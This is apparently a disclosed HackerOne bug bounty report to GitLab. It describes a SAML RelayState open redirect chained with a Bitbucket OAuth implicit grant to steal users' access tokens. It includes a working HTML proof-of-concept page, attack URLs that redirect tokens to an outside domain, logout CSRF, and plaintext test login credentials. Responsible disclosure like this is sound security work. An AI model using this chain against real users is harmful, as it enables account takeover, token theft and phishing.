# Account takeover due to insufficient URL validation on RelayState parameter

## Report Details
- **Report ID**: 1923672
- **URL**: https://hackerone.com/reports/1923672
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-03-29T13:01:19.598Z
- **Disclosed**: 2023-05-30T08:46:24.008Z

## Reporter
- **Username**: bull
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
Hi,


I have found an issue which can be used by an attacker to steal Bitbucket access token along with Other third party access tokens(google, salesforce etc). But the most important one is bitbucket. 


Issue:
=====


* there is open redirect while loggin to gitlab Via SAML, while the Open redirect is not much impactful since it is a post based request coming from third party domain, but the redirect happens and is also saved along in the gitlab cookies while being redirect and next time user visits `gitlab.com/user/sign_in`, he is automatically sent to the redirect


### open redirect:
{F2260468}


This chain can be used to steal third party access token `login with google, github, bitbucket, twitter, salesforce ....... etc` but we will focus on bitbucket for the following reason:

It has the presaved oauth scopes which is wide and also the client id is same as that of when you use the import project from bitbucket feature:

{F2260558}


Scope : (Read acccess to all data in account and some write access, projects's wikis):

{F2260561}


similar is the case for Github, but Github doesn't allow implicit grant. 

### implicit grant for bitbucket:

this simply returns access token as bearer to attacker's domain , which can be used to access full bitbucket api.

This makes both users vulnerable,:
`people who chose to log in with bitbucket`
`people who chose other means of login, but have previously imported project from bitbucket into gitlab`

POC:
=====

 ### As victim:

 make sure you have previously used bitbucket with gitlab, weather for login with bitbucket or for importing project.


### As attacker:

* setup a group with SAML Login and setup a user to log into gitlab with SAML

Here are my credentials for triage purposes: (Please note i will revoke these credentials upon triage, let me know if you need them longer or dont need them at all)

https://bugcrowd-iambull-2.oktapreview.com/

username: `gitlab@gitlab.com`
password : `Gliatb4passtbx!`

security answer: `Gliatb`




POC:
=====


* log victim out with Logout CSRF

* use SAML creds to save open redirect for victim:

https://bugcrowd-iambull-2.oktapreview.com/app/bugcrowd-iambull-2_gitlabcom_1/exk1lit3jovMjvewh0h8/sso/saml?RelayState=.witcoat.com

* initiate bitbucket oauth by changing response_type to `token`

https://bitbucket.org/site/oauth2/authorize?client_id=b9jLmh8WCLZPBAwWba&redirect_uri=https%3A%2F%2Fgitlab.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback&response_type=token&state=DoesNotMatter

* try using stolen bitbucket api:

```
GET /2.0/repositories/%7B766210f9-9bec-4010-9f4d-917b06661c0c%7D HTTP/2
Host: api.bitbucket.org
User-Agent: curl/7.79.1
Accept: */*
Authorization: Bearer Txpo3AXXQZHlp....

```




here is the poc for doing everything step by step, **please note all this can be automated with window.open for 1 click exploit**


```
<html>
<title>GitLab</title>


<body>
	
<span>Logout of gitlab if logged in:</span>

<form action="https://gitlab.com/users/sign_out" target="_blank" method="post"><button>Logout Gitlab Account</button></form>

<br>
<br>
<br>
<br>

<span>Open redirect via SAML:</span>

<form action="https://bugcrowd-iambull-2.oktapreview.com/app/bugcrowd-iambull-2_gitlabcom_1/exk1lit3jovMjvewh0h8/sso/saml" target="_blank" method="get">
	<input type="hidden" name="RelayState" value=".witcoat.com" /> 
	<button>Save Open Redirect</button></form>
<br>


<span>steal oauth access Token For Bitbucket:</span>

<form action="https://bitbucket.org/site/oauth2/authorize" target="_blank" method="get">
	<input type="hidden" name="client_id" value="b9jLmh8WCLZPBAwWba" /> 
  <input type="hidden" name="redirect_uri" value="https://gitlab.com/users/auth/bitbucket/callback" /> 
  <input type="hidden" name="response_type" value="token" /> 
    <input type="hidden" name="state" value="Doesnotmatter" /> 


	<button>Steal Bitbucket Code</button>
</form>


</body>



</html>
```



here is the video of going through steps:

{F2260621}

## Phishing Vector:

Upon saving open redirect into the cookies, when the user clicks signin on `about.gitlab.com` he will be redirected to external domain to steal credentials:

{F2260648}



Please let me know if you need any more information or if i missed something
thanks
Bull

## Impact

Steal bitbucket access token, which can be used to import victim's any repository, and also write access to victim's any wiki in bitbucket, 
also this can be used to steal access tokens for other providers such as google, salesforce twitter etc.....

Also this can be used to phish users

## Attachments
- Screenshot_2023-03-29_at_4.14.02_PM.png
- Screenshot_2023-03-29_at_4.43.25_PM.png
- Screenshot_2023-03-29_at_1.46.27_PM.png
- f_gitlab.mov
- phish_g.mov
